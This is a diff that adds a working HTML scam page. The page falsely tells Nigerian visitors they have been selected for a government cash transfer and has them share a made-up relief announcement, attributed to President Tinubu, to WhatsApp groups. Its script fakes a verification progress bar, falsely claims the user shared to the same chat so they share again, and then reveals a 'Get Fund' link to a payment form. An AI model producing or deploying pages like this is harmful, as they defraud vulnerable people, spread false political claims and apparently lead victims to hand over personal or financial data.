@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #02B769;
+            color: #fff;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin: 20px;
+            padding: 20px;
+            background: #fff;
+            color: #333;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin: 20px auto;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007bff;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 20px;
+            text-align: center;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+        .progress-container {
+            width: 100%;
+            background-color: #ddd;
+            border-radius: 25px;
+            margin-top: 20px;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 20px;
+            background-color: #4caf50;
+            border-radius: 25px;
+            text-align: center;
+            line-height: 20px;
+            color: white;
+        }
+        .message {
+            margin-top: 10px;
+            color: #333;
+        }
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .get-fund {
+            display: none;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.imgur.com/v0wVqwf.jpeg" alt="Congratulations">
+        <h1>Congratulations,</h1>
+        <p>You are among the selected people to receive the cash transfer from FG.</p>
+        <p>How to proceed:</p>
+        <ol>
+            <li>Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</li>
+            <li>You will be redirected automatically to our "PAYMENT FORM" page after the GREEN verification bar is filled.</li>
+            <li>You will receive a confirmation mail within 24 hours after successful application.</li>
+        </ol>
+
+        <div class="button-group">
+            <a href="Page3.html" class="button">Back</a> <!-- Back button to Page3.html -->
+            <button class="button" onclick="share()">Share</button>
+        </div>
+
+        <div class="progress-container">
+            <div id="progress-bar" class="progress-bar"></div>
+        </div>
+        <p id="message" class="message"></p>
+
+        <!-- Get Fund button, initially hidden -->
+        <a href="PaymentForm.html" id="get-fund-button" class="button get-fund">Get Fund</a>
+    </div>
+
+    <script>
+        let progress = 0;
+        let progressSteps = [20, 45, 60, 75, 90, 92, 95, 97, 98, 100];
+        let stepIndex = 0;
+
+        function share() {
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Emergency Economic Relief Package',
+                    text: `In response to the recent protests and economic hardship faced by Nigerians, President Bola Ahmed Tinubu has announced an emergency economic relief package to alleviate the suffering of citizens. The package includes a one-time payment of 50,000 Naira for every Nigerian citizen.\n\nClick on the portal to Apply`,
+                    url: 'https://yourwebsite.com/Page.html'
+                }).catch(error => console.error('Error sharing:', error));
+            } else {
+                alert('Sharing not supported on this browser.');
+            }
+
+            // Start progress after share is clicked
+            setTimeout(updateProgress, 4000);
+        }
+
+        function updateProgress() {
+            if (stepIndex < progressSteps.length) {
+                progress = progressSteps[stepIndex];
+                document.getElementById('progress-bar').style.width = progress + '%';
+
+                if (progress === 45 || progress === 75) {
+                    document.getElementById('message').textContent = 'You have shared to the same chat. Please share again.';
+                } else if (progress === 100) {
+                    document.getElementById('message').textContent = 'Click on "Get Fund" to complete the application.';
+                    document.getElementById('get-fund-button').style.display = 'inline-block'; // Show the "Get Fund" button
+                } else {
+                    document.getElementById('message').textContent = '';
+                }
+                stepIndex++;
+            }
+        }
+    </script>
+</body>
+</html>
